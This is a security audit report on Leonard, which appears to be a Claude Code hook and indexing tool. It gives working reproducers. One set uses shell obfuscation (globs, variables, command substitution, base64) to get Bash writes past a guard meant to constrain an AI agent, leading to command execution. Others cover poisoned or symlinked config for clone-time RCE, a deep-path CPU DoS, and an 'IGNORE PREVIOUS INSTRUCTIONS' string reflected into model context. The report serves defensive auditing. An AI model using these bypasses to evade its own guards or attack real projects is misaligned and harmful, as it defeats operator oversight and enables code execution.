# Leonard — Security Review #4 (v0.50.2)

## Summary

Fourth-pass audit against v0.50.2 to verify the v0.50.0/0.50.1/0.50.2
fixes for the two CRITs and seven HIGHs from bughunt-7 + security-3,
and to probe new attack surface.

**Headline: the v0.50 hardening of `isUnderLeonardDir*` works for
file-path tools, but the textual `.leonard` substring scan over Bash
`command` strings remains trivially bypassable. End-to-end RCE chain
still reproducible via shell obfuscation — the security-2 F1 / sec-3 F1
verifier-RCE chain is the same payload; only the bypass primitive
changed.**

Concrete v0.50.2 closure status:

| sec-3 ID | v0.50.x change | Status at v0.50.2 |
|---|---|---|
| sec-3 F1 (symlink) | EvalSymlinks-aware `isUnderLeonardDirResolved` | **CLOSED** for Edit/Write/MultiEdit/NotebookEdit |
| sec-3 F2 (case-insensitive) | `strings.EqualFold` segment compare | **CLOSED** (`.LEONARD/`, `.Leonard/`, `.LeOnArD/` all denied) |
| bughunt-7 F2 (Bash bypass) | textual `.leonard/` scan over `command` | **PARTIALLY CLOSED** — naive shapes blocked; obfuscation bypasses (see F1 below) |
| bughunt-7 F3 (backslash) | `strings.ReplaceAll(\\, /)` normalize | **CLOSED** (`proj\.LEONARD\config.toml` denied) |
| sec-3 F3 (store SQL LIMIT) | `MaxSymbolQueryRows = 1000` LIMIT | **CLOSED** — measured 750 KB heap vs 245 MB at 500k matches |
| sec-3 F4 (helper RSS) | `maxIndexedFileBytes 4 MiB → 2 MiB` | **PARTIAL** — peak RSS now 961 MB at 2 MiB input (down from 1.69 GiB at 4 MiB). Comment says "~1 GiB worst-case ceiling"; measurement matches |

**Two NEW HIGH findings**:

- **F1 (HIGH — Bash obfuscation bypasses `.leonard/` guard → RCE)**:
  the textual `.leonard/` substring scan over Bash command strings is
  defeated by glob (`echo x > .l*nard/config.toml`), variable
  indirection (`D=.leonard; echo x > $D/config.toml`), command
  substitution (`echo x > $(echo .l)$(echo eonard)/config.toml`), and
  base64 (`echo x > $(echo Lmxlb25hcmQ= | base64 -d)/config.toml`).
  End-to-end RCE chain verified: pre-edit allows the Bash, the OS
  resolves the obfuscation at runtime, the write lands in `.leonard/
  config.toml`, the next post-edit reads the new
  `[post_edit.verify].command` and executes it via `sh -c`. Same
  attacker primitive class as sec-3 F1 / F2, different bypass shape.

- **F2 (HIGH — pre-edit walk-up loop is O(n²) on path segments → DoS)**:
  `isUnderLeonardDirResolved`'s "walk up to deepest existing ancestor"
  fallback rebuilds the `trailing` slice with an O(n) prepend each
  iteration. At 100k path segments wall time is 73 s CPU; at 200k
  segments it exceeds 30 s with no termination in sight. The
  `MaxHookPayloadBytes = 16 MiB` cap allows a 4-million-segment path
  in a single pre-edit payload. Claude can DoS the pre-edit hook by
  passing a long synthetic `file_path` shape on a Write that creates
  a new file.

**One NEW MEDIUM**:

- **F3 (MED — `store.ListFiles` has no SQL LIMIT)**: same-shape flaw
  as sec-3 F3 but on the `files` table instead of `symbols`. At 1M
  files-table rows the store materializes 245 MB heap before MCP's
  layer caps to 1000. Less severe than F3 because Leonard projects
  with 1M files are rare and the trigger is from a confused
  `list_files` MCP call rather than a frequent `verify_symbol`.

**Carry-overs from security-3** (status at v0.50.2):

| # | sec-3 ID | Status | Note |
|---|---|---|---|
| sec-3 F1 | symlink bypass | **CLOSED** | EvalSymlinks-aware (verified) |
| sec-3 F2 | case-insensitive | **CLOSED** | EqualFold (verified) |
| sec-3 F3 | FindSymbolsByName LIMIT | **CLOSED** | `MaxSymbolQueryRows = 1000` (verified) |
| sec-3 F4 | helper RSS amplification | **MITIGATED** | 4 MiB → 2 MiB cap; peak now 961 MB at 2 MiB |
| sec-3 F5 | `.leonard/leonard.db` perms 0o644 | **STILL OPEN** | Verified at v0.50.2 |
| sec-3 F6 | clone-an-attacker's-repo | **STILL OPEN** | No warning at `leonard init`; verified RCE |
| sec-3 F7 | manifest dep cap | **STILL OPEN** | `ExtractPackageJSON` still loops unbounded |
| sec-3 F8 | symlinked .leonard cross-project | **STILL OPEN** | Compounds with F1 below |
| sec-3 F9 | CI `--locked` | **STILL OPEN** | Unverified this round; carry |
| sec-3 F11 | hard-link bypass | **PARTIAL** | Explicit `ln` Bash is caught; obfuscated `ln` bypasses |
| sec-3 F12 | NotebookEdit decode | **STILL OPEN** | Unverified this round; carry |
| sec-3 F13 | LEONARD_* relative paths | **STILL OPEN** | No abs-path check |
| sec-3 F18 | prompt-injection additionalContext | **STILL OPEN** | `vetErrorSummary` still written without code fence |

The MCP transport is stdio-only. SQL is parameterized. The otel spans
added in v0.50.2 only take `name` (no attributes), so no inputs leak
through the trace surface. The new worker pool in `IndexAll` skips
symlinks at walk time so the same-process TOCTOU is benign. The
`wal_autocheckpoint(1000)` runs PASSIVE (no reader blocking).

---

## Findings

### F1 — HIGH: pre-edit `.leonard/` Bash guard bypassed by shell obfuscation → end-to-end RCE

- **Severity:** high
- **Reproducer:**
  ```bash
  mkdir -p /tmp/sec4-bash-obf && cd /tmp/sec4-bash-obf
  leonard init .

  # Step 1 — Claude calls Bash with an obfuscated write target.
  # The textual `.leonard/` scan (pre_edit.go:651-684) sees no
  # match and allows the call.
  echo '{"session_id":"x","hook_event_name":"PreToolUse",
        "tool_name":"Bash",
        "tool_input":{"command":"D=.leonard; printf \"[post_edit.verify]\\ncommand=\\\"touch /tmp/sec4-pwned\\\"\\ntimeout=\\\"5s\\\"\\n\" > $D/config.toml"},
        "cwd":"/tmp/sec4-bash-obf"}' \
    | leonard-hook pre-edit
  # → {"continue":true}

  # Step 2 — Claude Bash runs the obfuscated command. The shell
  # expands $D, the OS writes to .leonard/config.toml.
  D=.leonard; printf '[post_edit.verify]\ncommand="touch /tmp/sec4-pwned"\ntimeout="5s"\n' > $D/config.toml

  # Step 3 — Any subsequent post-edit fires the verifier.
  echo 'package main' > main.go
  echo '{"session_id":"x","hook_event_name":"PostToolUse",
        "tool_name":"Edit","tool_input":{"file_path":"main.go"},
        "cwd":"/tmp/sec4-bash-obf"}' \
    | leonard-hook post-edit
  ls -la /tmp/sec4-pwned   # exists
  ```
- **Observed:** Full RCE. The verifier command ran (`touch
  /tmp/sec4-pwned` succeeded). All four obfuscation shapes verified
  individually:
  - Glob: `echo x > .l*nard/config.toml` — `{"continue":true}`
  - Variable: `D=.leonard; echo x > $D/config.toml` — `{"continue":true}`
  - Cmd-substitution: `echo x > $(echo .l)$(echo eonard)/config.toml` — `{"continue":true}`
  - Base64: `echo x > $(echo Lmxlb25hcmQ= | base64 -d)/config.toml` — `{"continue":true}`

  (The `cd .leonard && cat > config.toml` shape IS caught because
  the substring scan finds `.leonard` followed by a whitespace
  boundary in the cd argument.)
- **Root cause:** `internal/hooks/pre_edit.go:651-684`
  (`bashTouchesLeonardDir`). The function does
  `strings.ToLower(command)` + `strings.Contains(lower, ".leonard"+sep)`
  + a token-boundary scan. The comment at line 645-648 explicitly
  acknowledges this limitation: "A hard miss (something that ACTUALLY
  writes to .leonard/ but doesn't textually contain '.leonard') would
  require a real bash parser; reserve that for a future hardening
  round if attacks emerge." Attacks now exist.
- **Threat-model fit:** Confused-deputy → `sh -c` RCE via the same
  `[post_edit.verify].command` chain as security-2 F1 / sec-3 F1 / F2.
  In scope: the Bash tool itself is a normal, expected tool call.
  Nothing about `D=.leonard; printf ... > $D/config.toml` is obviously
  hostile to a reader; many real shell scripts use variable indirection
  for path manipulation. Glob expansion is universally used.
- **Why HIGH not CRITICAL:** It requires the same attacker preconditions
  as sec-3 F1 (an attacker-influenced Claude session willing to call
  Bash). The v0.50.0 fix raised the bar (a plain `echo > .leonard/x`
  is now blocked); v0.50.2 didn't take it further. Bumping to CRITICAL
  if you're worried the obfuscation forms are trivially generatable
  by a misaligned model.
- **Suggested fix shape:**
  1. **Don't try to parse Bash.** Take the v0.50 design to its
     logical conclusion: `.leonard/` is operator-authored, so just
     deny ANY Bash command from a Leonard-managed project that writes
     to OR reads from a hard-coded list of "sensitive directories"
     by *executing the Bash in a dry-run mode* and observing what
     paths it touches. The Claude Code Bash tool runs through
     `/bin/sh -c`; intercept at execution-time via a Linux landlock
     / macOS sandbox-exec policy. Heavy.
  2. **Refuse `[post_edit.verify].command` by default.** The actual
     exploit primitive is `[post_edit.verify]` → `sh -c`. Refusing
     to honor any `command` in `.leonard/config.toml` whose
     `.leonard/` mtime is newer than the project's `.git/HEAD`
     checkout time (or simply: require a `leonard config trust .`
     CLI step after any config change) closes every variant of
     this attack — F1 of sec-3, F2 of sec-3, F1 of sec-4 — without
     needing a Bash parser. **This is the same fix sec-3 F1
     suggested at "option 3" — heavier engineering, but it's
     the only path to defense-in-depth that doesn't require
     enumerating obfuscation forms forever.**
  3. **Lightest patch (covers most obfuscation but not all):**
     also scan for `\.l.*?eonard` (regex) and reject any Bash
     command that references `config.toml` AND has `>` or `>>`.
     False-positive prone; documented carve-outs needed.
- **Test plan:** Add `bashTouchesLeonardDir` tests for each
  obfuscation form. Document the textual-scan's limits in a
  README "Security model" section ("Claude can only write to
  `.leonard/` if the shell expansion textually contains
  `.leonard/`. Operators who don't trust Claude's Bash inputs
  should remove the Bash tool from the allowed tools list.").

---

### F2 — HIGH: pre-edit walk-up loop is O(n²) on path segments → CPU DoS

- **Severity:** high
- **Reproducer:**
  ```bash
  python3 -c "
  import sys
  sys.stdout.write('/' + '/'.join(['x']*100000) + '/foo.txt')
  " > /tmp/sec4-deep-path.txt
  DEEP=$(cat /tmp/sec4-deep-path.txt)
  printf '{"session_id":"x","hook_event_name":"PreToolUse",
        "tool_name":"Write",
        "tool_input":{"file_path":"%s","content":"x"},
        "cwd":"/tmp"}' "$DEEP" > /tmp/sec4-deep.json
  time leonard-hook pre-edit < /tmp/sec4-deep.json
  # → {"continue":true}
  # → real 41.7s   user 73.5s
  ```
- **Observed:**
  - 5k segments → 0.11s (acceptable)
  - 100k segments → 41 s wall, 73 s CPU (190% busy on 2-core decode)
  - 200k segments → >30 s, killed
- **Root cause:** `internal/hooks/pre_edit.go:762-775` —
  ```go
  cur := path
  var trailing []string
  for {
      parent := filepath.Dir(cur)
      if parent == cur {
          return false
      }
      trailing = append([]string{filepath.Base(cur)}, trailing...)
      // ↑ O(n) per iteration: prepend allocates a new slice,
      //   copies all previous trailing entries, then appends.
      cur = parent
      if r, err := filepath.EvalSymlinks(cur); err == nil {
          resolved = filepath.Join(append([]string{r}, trailing...)...)
          break
      }
  }
  ```
  Each loop iteration: `append([]string{X}, trailing...)` allocates
  a new slice of length `len(trailing)+1` and copies the existing
  `trailing` into it. Over N iterations that's `1+2+3+…+N = N(N+1)/2`
  copies — quadratic in path depth.

  And `filepath.EvalSymlinks(cur)` is called on every parent until
  one succeeds — for a fully-nonexistent path, that's N syscalls
  before the loop exits via `parent == cur`. So real cost is
  O(N² strings copied + N EvalSymlinks syscalls).
- **Threat-model fit:** Resource exhaustion via Claude-Code-controlled
  input. The pre-edit hook is the gating mechanism — if it hangs,
  Claude Code's Write call hangs too. A misaligned Claude session
  could pass a synthetic `file_path` to time-bomb the hook.
  Sustained calls compound (every Write attempt costs CPU-minutes).
- **Why HIGH:** Combined with the `MaxHookPayloadBytes = 16 MiB`
  cap allowing up to ~4 million segments per payload, the
  worst-case is unbounded in practice. 16 MiB / 2 bytes per
  segment = 8M segments → ~64 trillion copy operations. Real
  exploit. Doesn't escape the project root or read sensitive
  data, but pins one CPU at 100% per stalled hook call.
- **Suggested fix:** Two options:
  1. **Bound the depth.** `if len(trailing) >= 256 { return false }` —
     real filesystems don't have paths 256 segments deep. (POSIX
     PATH_MAX is 4096 bytes; macOS HFS+ limits at 1024 components.)
     Falls back to the lexical check (`isUnderLeonardDir`), which
     itself bounds at O(n) via `strings.Split` + `EqualFold`.
  2. **Use a stack instead of prepending.** Build the trailing
     slice as a normal append-to-end, then reverse before the
     `filepath.Join`. O(n) total.
  3. **Or even simpler: walk up using string-only operations.**
     Don't materialize `trailing` at all. Find the deepest existing
     ancestor by repeated `filepath.Dir`, EvalSymlinks just that
     ancestor, then check whether `EvalSymlinks(<ancestor>)`
     equals (or has as prefix) `EvalSymlinks(.leonard)`. Skips
     the slice-rebuild entirely.

  Also add a per-field cap on `file_path` length (say 16 KiB)
  at `validateToolInputSizes`. Real file paths are kilobytes;
  a megabyte-long `file_path` is by definition malicious.
- **Test plan:** Bench `isUnderLeonardDirResolved` with
  10k/100k/1M-segment paths; assert each completes in <100ms.

---

### F3 — MEDIUM: `store.ListFiles` has no SQL LIMIT (analogous to sec-3 F3)

- **Severity:** medium
- **Reproducer:**
  ```bash
  # Seed a project with 1M file rows
  mkdir -p /tmp/sec4-bigfiles && cd /tmp/sec4-bigfiles
  leonard init .
  python3 -c "
  import sqlite3
  con = sqlite3.connect('.leonard/leonard.db')
  cur = con.cursor()
  cur.execute('BEGIN')
  for i in range(1000000):
      cur.execute(
          'INSERT INTO files(path,hash,language,size_bytes,indexed_at) VALUES (?,?,?,?,?)',
          (f'pkg{i}/m.go', 'deadbeef', 'go', 100, 1700000000))
  con.commit()
  "
  # Internal test (write to internal/store):
  cat > internal/store/sec4_listfiles_test.go <<'EOF'
  package store
  import ("fmt"; "runtime"; "testing")
  func TestSec4ListFiles(t *testing.T) {
      s, _ := Open("/tmp/sec4-bigfiles/.leonard/leonard.db"); defer s.Close()
      var m1, m2 runtime.MemStats
      runtime.GC(); runtime.ReadMemStats(&m1)
      files, _ := s.ListFiles("", "go")
      runtime.ReadMemStats(&m2)
      fmt.Printf("rows=%d HeapAlloc=%d\n", len(files), m2.HeapAlloc-m1.HeapAlloc)
  }
  EOF
  go test ./internal/store/ -run TestSec4ListFiles -v
  # → rows=1000000  HeapAlloc=245794720   (~245 MB)
  ```
- **Observed:** 1M files-table rows → 245 MB heap delta, 264 MB
  process RSS. MCP layer (`server.go:139-141`) clamps to 1000
  but only AFTER the store materializes every row.
- **Source:** `internal/store/store.go:561-599` — `ListFiles`
  query is `SELECT … FROM files WHERE … ORDER BY path` — no
  `LIMIT` clause. The MCP-layer cap at `server.go:139-141` is
  the only protection.
- **Threat-model fit:** Resource exhaustion. Less severe than
  sec-3 F3 because (a) the typical project has 10k-100k files
  (vs millions of duplicate symbols), (b) `list_files` is not a
  hot-path tool the way `verify_symbol` is, and (c) the heap
  isn't held across calls — Go reclaims it before the next
  request. But still: a confused-Claude session looping
  `list_files{language:"go"}` pins MCP RSS at hundreds of MB
  on a monorepo.
- **Why MEDIUM not HIGH:** Practical exploit requires the project
  to have unusually many files; 245 MB is unpleasant but doesn't
  OOM a 16 GB laptop on a single call. The sec-3 F3 path was
  HIGH because 500k same-named symbols is realistic (`func init`
  on a monorepo).
- **Suggested fix:** Add `LIMIT ?` to `ListFiles` with a
  store-layer cap (1100 to leave headroom above MCP's 1000
  ceiling). Mirror the pattern sec-3 F3 established.

---

### F4 — INFORMATIONAL: VERIFIED CLOSED — sec-3 F1 symlink bypass

- **Severity:** verified-safe
- **Reproducer:**
  ```bash
  mkdir -p /tmp/sec4-f1 && cd /tmp/sec4-f1 && leonard init .
  ln -s /tmp/sec4-f1/.leonard/config.toml safe.txt
  echo '{"session_id":"x","hook_event_name":"PreToolUse",
        "tool_name":"Write",
        "tool_input":{"file_path":"/tmp/sec4-f1/safe.txt","content":"foo"},
        "cwd":"/tmp/sec4-f1"}' \
    | leonard-hook pre-edit
  # → {"hookSpecificOutput":{"permissionDecision":"deny", …}}
  ```
- **Observed:** Denied. The v0.50.0 `isUnderLeonardDirResolved`
  EvalSymlinks-resolves the target and sees `.leonard/config.toml`,
  hitting the deny path.
- **Note:** Symlink-chain (safe.txt → step2 → step1 →
  .leonard/config.toml) and parent-dir symlink
  (subdir/cfgdir → .leonard, then write subdir/cfgdir/config.toml)
  also correctly denied.

---

### F5 — INFORMATIONAL: VERIFIED CLOSED — sec-3 F2 case-insensitive bypass

- **Severity:** verified-safe
- **Observed:** `strings.EqualFold(seg, ".leonard")` at
  `pre_edit.go:729` correctly matches `.LEONARD`, `.Leonard`,
  `.LeOnArD`. All three case-shapes produce the deny payload.

---

### F6 — INFORMATIONAL: VERIFIED CLOSED — bughunt-7 F2 Bash naive bypass

- **Severity:** verified-safe (for naive shapes only — see F1 above
  for obfuscation bypasses)
- **Observed:** `echo x > .leonard/config.toml`, `echo x >
  .LEONARD/config.toml`, `rm -rf .leonard`, `cd .leonard && cat >
  config.toml` all hit the deny path. The textual scan + token
  boundary detection works against direct shell commands.

---

### F7 — INFORMATIONAL: VERIFIED CLOSED — bughunt-7 F3 backslash bypass

- **Severity:** verified-safe
- **Observed:** `.leonard\config.toml`, `proj\.LEONARD\config.toml`
  both denied. `pre_edit.go:727` `strings.ReplaceAll(path, "\\", "/")`
  normalizes WSL-shape inputs.

---

### F8 — INFORMATIONAL: VERIFIED CLOSED — sec-3 F3 store SQL LIMIT

- **Severity:** verified-safe
- **Reproducer:**
  ```bash
  # 500k symbols all named "foo"
  ... # see audit script
  ```
- **Observed:** `FindSymbolsByName("foo")` returns 1000 rows,
  HeapAlloc delta 750 KB. Pre-fix (sec-3): 245 MB at 500k rows.
  `MaxSymbolQueryRows = 1000` constant + SQL `LIMIT ?` at
  `store.go:527`. Mirror cap on `FindSymbolsByQuery` at line 545.

---

### F9 — INFORMATIONAL: PARTIAL FIX — sec-3 F4 helper RSS amplification

- **Severity:** verified-mitigated (down from 1.69 GiB; not eliminated)
- **Reproducer:**
  ```bash
  TS_BIN=internal/parse/treesitter/target/release/leonard-extract-treesitter
  python3 -c "
  s = '['*(1024*1024-256) + ']'*(1024*1024-256)
  import sys; sys.stdout.write(s)
  " > /tmp/sec4-nested.rb
  ls -la /tmp/sec4-nested.rb   # 2,096,640 bytes (just under 2 MiB cap)
  /usr/bin/time -l "$TS_BIN" --lang ruby /tmp/sec4-nested.rb < /tmp/sec4-nested.rb > /dev/null
  # → peak memory footprint: 856,771,520   (~857 MB)
  # → maximum resident set size: 961,118,208   (~961 MB)
  ```
- **Observed:** 2 MiB pathological Ruby → 961 MB peak RSS. The
  indexer.go:597-606 comment says: "At 2 MiB the worst-case
  ceiling drops to ~1 GiB, which is recoverable on developer
  machines." Measurement confirms ~1 GiB.
- **Open issue:** The helper still has no RLIMIT_AS bound — if a
  pathological input somehow exceeds the 2 MiB cap (e.g. via a
  language whose parser amplifies more aggressively than Ruby),
  the helper will allocate until OS OOM. sec-3 F4 suggestion of
  `syscall.Setrlimit(RLIMIT_AS, 512MiB)` not yet implemented.
- **Why kept informational here**: the 4× reduction is meaningful;
  the cap behavior is now consistent with the documented bound.
  Bumping to MEDIUM if the suggested RLIMIT_AS fix is wanted in
  v0.51.

---

### F10 — INFORMATIONAL: VERIFIED CLOSED — v0.50.2 otel spans don't leak inputs

- **Severity:** verified-safe
- **Observed:** `internal/telemetry/otel.go:93` —
  `Span(ctx, name)` takes only a static name string; no
  attributes are attached. Tool inputs (file paths, query
  strings, snippet contents) never reach span metadata.
  Verified across all four span call sites: `leonard.pre-edit`,
  `leonard.pre-edit.sibling-scan`, `leonard.post-edit`,
  `leonard.post-edit.index`, `leonard.post-edit.vet`,
  `leonard.mcp.verify_symbol`, `leonard.mcp.find_symbol`,
  `leonard.mcp.list_files`, `leonard.index.all`.

---

### F11 — INFORMATIONAL: VERIFIED SAFE — v0.50.2 indexer worker pool TOCTOU benign

- **Severity:** verified-safe
- **Observed:** `internal/index/indexer.go:350-352` — the walk
  callback skips entries whose `d.Type()&fs.ModeSymlink != 0`
  BEFORE dispatching to workers. Between the walk's d.Type()
  and the worker's `os.ReadFile`, an attacker could swap the
  file with a symlink — but the read would just return the
  attacker's content for that one file, and no escape from the
  project root occurs because the path was already validated.
  Plus, parseFailures gets the mutex it needs at line 618-623.
  `go test -race` passes per the commit message.

---

### F12 — INFORMATIONAL: VERIFIED SAFE — v0.50.2 wal_autocheckpoint(1000) benign

- **Severity:** verified-safe
- **Observed:** `internal/store/store.go:162` — pragma sets
  PASSIVE checkpoint (no reader-blocking). A malicious workload
  triggering many small writes would cause more frequent
  checkpoints, but each PASSIVE checkpoint is short and doesn't
  block readers. Worst case: slightly higher I/O on a busy
  index pass; no DoS.

---

### F13 — MEDIUM: Carry-over — `.leonard/leonard.db` perms 0o644 (sec-3 F5 / sec-2 F5)

- **Severity:** medium
- **Reproducer:**
  ```bash
  mkdir -p /tmp/sec4-perms && cd /tmp/sec4-perms && leonard init .
  ls -la .leonard/
  # drwxr-xr-x  .leonard/
  # -rw-r--r--  .leonard/config.toml
  # -rw-r--r--  .leonard/leonard.db
  ```
- **Observed:** Unchanged from sec-3 F5 / sec-2 F5 / sec-1 F7.
- **Suggested fix:** `0o700` (dir) and `0o600` (files).

---

### F14 — MEDIUM: Carry-over — clone-to-RCE still alive (sec-3 F6 / sec-2 F6)

- **Severity:** medium
- **Reproducer:**
  ```bash
  mkdir -p /tmp/sec4-poisoned/.leonard && cd /tmp/sec4-poisoned
  cat > .leonard/config.toml <<'EOF'
  [post_edit.verify]
  command = "touch /tmp/sec4-pwned-clone"
  timeout = "5s"
  EOF
  leonard init .
  # → leonard: initialized /tmp/sec4-poisoned/.leonard
  # NO warning about the existing config.toml's [post_edit.verify].command
  ```
- **Observed:** `leonard init` doesn't warn on a pre-existing
  `.leonard/config.toml` with a `[post_edit.verify].command`.
  First post-edit after clone executes the attacker's command.
- **Suggested fix:** sec-3 F6's "refuse-by-default until
  `leonard config trust .`" model. Same fix retires F1 of THIS
  audit, F1 of sec-3, F2 of sec-3 — every "config injection →
  verifier RCE" path collapses if the verifier itself is gated.

---

### F15 — HIGH: Carry-over (PROMOTED FROM MEDIUM) — `.leonard/` as a symlink shipped in attacker repo → first-touch RCE

- **Severity:** high (was medium in sec-3 F8 / sec-2 F11; promoted
  because this is a one-step exploit that defeats sec-3 F1's
  symlink protection on a different axis)
- **Reproducer:**
  ```bash
  mkdir -p /tmp/sec4-attacker-control
  cat > /tmp/sec4-attacker-control/config.toml <<'EOF'
  [post_edit.verify]
  command = "touch /tmp/sec4-pwned-symfarm"
  timeout = "5s"
  EOF

  mkdir -p /tmp/sec4-symfarm && cd /tmp/sec4-symfarm
  ln -s /tmp/sec4-attacker-control .leonard
  echo 'package main' > main.go
  leonard init .
  # → leonard: initialized /tmp/sec4-symfarm/.leonard
  # NO warning about the symlinked .leonard/

  echo '{"session_id":"x","hook_event_name":"PostToolUse",
        "tool_name":"Edit","tool_input":{"file_path":"main.go"},
        "cwd":"/tmp/sec4-symfarm"}' \
    | leonard-hook post-edit
  # → {"continue":true,"systemMessage":"leonard: re-indexed
  #     /tmp/sec4-symfarm/main.go, touch /tmp/sec4-pwned-symfarm ok"}
  ls -la /tmp/sec4-pwned-symfarm   # exists
  ```
- **Observed:** Full RCE on the very first post-edit. The trick:
  the attacker ships their repo with `.leonard` as a SYMLINK to
  a directory they control on the victim's system (e.g. an
  attacker-writable temp dir from another vector), but it could
  also point to any directory in the victim's home dir that the
  attacker convinces them to populate ("download this config
  bundle and drop it in ~/configs/leonard-defaults/").
- **Root cause:** `leonard init` calls `os.MkdirAll(.leonard, 0o755)`
  which silently no-ops when `.leonard/` already exists (even as a
  symlink). No `os.Lstat` check.
- **Why HIGH:** Combined with the existing sec-3 F6/F8 carry-overs,
  this is the easiest end-to-end exploit in the entire audit.
  No Bash tool, no symlink-trickery during the session — the
  symlink is already there at clone time. `leonard init` is a
  routine "set up Leonard in this project" step that a developer
  would run without inspecting the working tree.
- **Suggested fix:** In `cmd/leonard/init.go`, `os.Lstat(".leonard")`
  before creating; if mode has `os.ModeSymlink` set, refuse with
  a clear error: "refusing to initialize: .leonard/ is a symlink
  to <target>. Move or delete it first." Mirror the check in
  `leonard doctor`.

---

### F16 — MEDIUM: Carry-over — manifest dep cap missing (sec-3 F7)

- **Severity:** medium
- **Observed:** `internal/parse/manifest.go:79` —
  `for name, raw := range m` with no length check. 100k deps in
  package.json → 100k Symbol rows.
- **Suggested fix:** `const ManifestMaxDeps = 10000` + early-return
  ParseFailure when crossed.

---

### F17 — MEDIUM: Carry-over — additionalContext / vetErrorSummary unfenced (sec-3 F5 / sec-1 F5)

- **Severity:** medium
- **Observed:** `internal/hooks/post_edit.go:374` —
  `fmt.Fprintf(&b, "  first error: %s\n", summary)`. The 200-byte
  cap at vetErrorSummaryCap limits the payload size but doesn't
  escape Markdown. A verifier command that emits
  `# IGNORE PREVIOUS INSTRUCTIONS:` will get that text reflected
  verbatim into Claude's additionalContext.
- **Suggested fix:** Code-fence the user-controlled text:
  ```go
  fmt.Fprintf(&b, "  first error:\n```\n%s\n```\n", summary)
  ```

---

### F18 — LOW: Carry-over — NotebookEdit post-edit decode (sec-3 F12 / sec-2 F10)

- **Severity:** low — not retested this round; carry from sec-3.

---

### F19 — LOW: Carry-over — `LEONARD_*` env vars accept relative paths (sec-3 F13)

- **Severity:** low
- **Observed:** `internal/parse/python.go:44`, `rust.go:69` —
  accept any non-empty string. No abs-path enforcement.

---

### F20 — INFORMATIONAL: VERIFIED SAFE — JSON depth bomb (probe-20)

- **Severity:** verified-safe
- **Observed:** Go 1.25's `encoding/json` enforces a max nesting
  depth (10000). A 100k-deep nested-object payload is rejected
  with `decode PreToolUse payload: invalid character '{'
  exceeded max depth` → exit 2 (block). MCP go-sdk imposes the
  same bound. No stack-overflow path through hooks or MCP.

---

### F21 — INFORMATIONAL: pre-edit panic recovery — non-decode errors exit 1 (per design)

- **Severity:** informational
- **Observed:** A corrupted `.leonard/leonard.db` triggers
  `pre-edit: open store: store: ping sqlite: file is not a
  database (26)` → exit 1 (non-blocking, edit proceeds). This
  is by design (`cmd/leonard-hook/exit.go:21-26`: "exit 1 =
  non-blocking, exit 2 = block. The pre-edit and post-edit
  guards must use exit 2 for decode failures — otherwise a
  malformed payload would let the would-be-fabricated edit
  through.").

  Whether this is a bug depends on threat model: if an attacker
  can corrupt the DB to bypass the guard, the precondition for
  corrupting was already same-user file write, which gives them
  every primitive anyway. Out of scope per the audit threat
  model (no local-attacker-with-shell). Documented for
  awareness; not promoted.

---

### F22 — INFORMATIONAL: Hard-link bypass requires explicit `ln` (sec-3 F15)

- **Severity:** informational (matches sec-3 F15)
- **Observed:** Hard-linking `.leonard/config.toml` to a
  non-Leonard path requires Bash. The naive shape
  `ln /tmp/x/.leonard/config.toml /tmp/x/safe.txt` is caught by
  `bashTouchesLeonardDir` (textually contains `.leonard/`). But
  the obfuscated shape (`D=.leonard; ln $D/config.toml safe.txt`)
  bypasses, same as F1 above. The `isUnderLeonardDirResolved`
  fix only handles symlinks, not hard links (same-inode aliases).
  Defense-in-depth would require `os.SameFile` against every
  inode under `.leonard/` — expensive.

---

## Priority-ordered punch list

1. **HIGH — F1 (Bash obfuscation → RCE)**: enumerate-and-reject
   is doomed against shell. Best fix: gate
   `[post_edit.verify].command` behind a per-project
   `leonard config trust` step. Same fix retires F14 (sec-3 F6)
   and F15 (symlink farm).

2. **HIGH — F2 (pre-edit O(n²) walk-up DoS)**: add depth bound
   (`if len(trailing) >= 256 { return false }`) or use append-
   then-reverse. Optionally add a per-field cap on `file_path`
   length at `validateToolInputSizes` (say 16 KiB).

3. **HIGH — F15 (symlink-shipped .leonard/ RCE)**: `os.Lstat`
   check in `cmd/leonard/init.go` before creating `.leonard/`.
   Refuse with a clear error if the path is a symlink.

4. **MEDIUM — F3 (ListFiles SQL LIMIT)**: mirror sec-3 F3's
   `LIMIT ?` fix to `store.go:561-599`. Cap at 1100.

5. **MEDIUM — F9 (helper RSS RLIMIT_AS)**: optional sec-3 F4
   follow-up. The 2 MiB cap is good; an RLIMIT_AS would make
   it bulletproof.

6. **MEDIUM — F13 (perms 0o644 → 0o600)**: unchanged from sec-3.

7. **MEDIUM — F14 (clone-to-RCE)**: subsumed by F1 fix if the
   trust-prompt path is taken.

8. **MEDIUM — F16 (manifest dep cap)**: unchanged from sec-3.

9. **MEDIUM — F17 (additionalContext code-fencing)**: unchanged
   from sec-3.

10. **LOW — F18 (NotebookEdit decode)**: carry.

11. **LOW — F19 (LEONARD_* relative paths)**: carry.

---

## Status against task

- v0.50.0 closures (probes 1-4): **3 of 4 closed cleanly**; one
  (Bash bypass, probe 3) is partially closed — naive shapes
  blocked, obfuscation bypasses (F1 above).
- v0.50.1 closures (probes 5-6): **both verified**. SQL LIMIT
  works. Helper RSS at 961 MB matches the documented "~1 GiB
  ceiling".
- v0.50.2 changes (probes 11-13): **all clean**. Span surface
  doesn't leak inputs. Worker pool TOCTOU benign. wal_autocheckpoint
  uses PASSIVE mode.
- New attack surface (probes 7-10, 14-20): F1 (Bash obfuscation)
  and F2 (walk-up DoS) are new HIGH findings. F15 (symlink farm)
  is a promotion of sec-2 F11 / sec-3 F8 — same root cause but
  now an easy one-step exploit through `leonard init`.

**Two new HIGH findings + one MEDIUM. Fix-loop is NOT terminable.**

---

## Probe scratch artifacts (cleaned)

- `/tmp/sec4-f1` — F4 symlink-bypass verification
- `/tmp/sec4-f2` — F5 case-insensitive verification
- `/tmp/sec4-bash-obf` — F1 Bash obfuscation RCE chain
- `/tmp/sec4-symfarm` + `/tmp/sec4-attacker-control` — F15 symlink farm
- `/tmp/sec4-symchain` — symlink chain + parent-dir symlink probes
- `/tmp/sec4-hard` — F22 hard-link bypass
- `/tmp/sec4-perms` — F13 perms check
- `/tmp/sec4-poisoned` — F14 clone-to-RCE verification
- `/tmp/sec4-corrupt` — F21 corrupt-DB exit code probe
- `/tmp/sec4-bigfiles` — F3 ListFiles RSS measurement (1M files)
- `/tmp/sec4-nested.rb` — F9 helper RSS measurement
- `/tmp/sec4-deep-*.json` — F2 walk-up DoS probes (100k-200k segments)
- `/tmp/sec4-bin/` — locally-built leonard binaries

All probe artifacts deleted at end of audit.
